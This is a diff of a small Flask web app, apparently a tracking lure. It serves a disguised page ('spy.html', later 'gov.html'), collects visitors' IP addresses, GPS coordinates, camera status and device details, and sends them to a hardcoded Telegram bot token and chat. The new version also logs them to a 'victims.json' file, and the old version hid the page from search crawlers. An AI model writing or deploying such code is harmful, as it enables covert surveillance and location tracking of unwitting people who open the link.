@@ -1,58 +1,55 @@
-from flask import Flask, request, render_template, send_from_directory
-import requests, os
+from flask import Flask, request, render_template
+import json
+import requests
+import os
+from datetime import datetime
 
-app = Flask(__name__, template_folder="templates", static_folder="static")
+app = Flask(__name__)
 
-# === Telegram Bot Configuration ===
-BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
-CHAT_ID = "6908281054"
+BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
+CHAT_ID = '6908281054'
 
-# === Block known bots via User-Agent ===
-BLOCKED_BOTS = [
-    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
-    "YandexBot", "Sogou", "Exabot", "facebot", "ia_archiver"
-]
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {
+        'chat_id': CHAT_ID,
+        'text': message,
+        'parse_mode': 'HTML'
+    }
+    requests.post(url, data=payload)
 
-# === Serve robots.txt to block crawlers ===
-@app.route('/robots.txt')
-def robots():
-    return "User-agent: *\nDisallow: /", 200, {'Content-Type': 'text/plain'}
-
-# === Home Page ===
 @app.route('/')
-def home():
-    ua = request.headers.get('User-Agent', '')
-    if any(bot in ua for bot in BLOCKED_BOTS):
-        return "Access Denied", 403
-    return render_template("spy.html")
+def index():
+    return render_template('gov.html')
 
-# === Data Collection Endpoint ===
 @app.route('/collect', methods=['POST'])
 def collect():
-    data = request.json
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    user_agent = data.get("userAgent", "Unknown")
-    device_info = data.get("deviceInfo", "Unknown")
-    latitude = data.get("latitude")
-    longitude = data.get("longitude")
-    camera = data.get("camera", "❌ Unknown")
-    location = f"https://maps.google.com/?q={latitude},{longitude}" if latitude and longitude else "❌ Location Not Available"
+    data = request.get_json()
+    ip = request.remote_addr
+    ua = data.get("userAgent")
+    lat = data.get("latitude")
+    lon = data.get("longitude")
+    cam = data.get("camera")
+    device = data.get("deviceInfo")
 
-    message = f"""
-👁️ شکار آیا!
+    message = f"""👁️ شکار آیا!
 🌐 IP Address: {ip}
-📱 Device: {user_agent}
-📍 Location: {location}
-📷 Camera: {camera}
-🧠 Device Info: {device_info}
-"""
+📱 Device: {ua}
+📍 Location: {'❌ Location Not Available' if not lat else f"{lat}, {lon}"}
+📷 Camera: {cam}
+🧠 Device Info: {device}
+⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
 
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-        'chat_id': CHAT_ID,
-        'text': message
-    })
+    send_to_telegram(message)
 
-    return "Data Received", 200
+    # Save locally
+    with open('victims.json', 'a') as f:
+        f.write(json.dumps(data) + '\n')
+
+    return '✅ Info Received'
+
+if __name__ == '__main__':
+    app.run(debug=True)
 
 # === Telegram Webhook ===
 @app.route(f"/{BOT_TOKEN}", methods=['POST'])
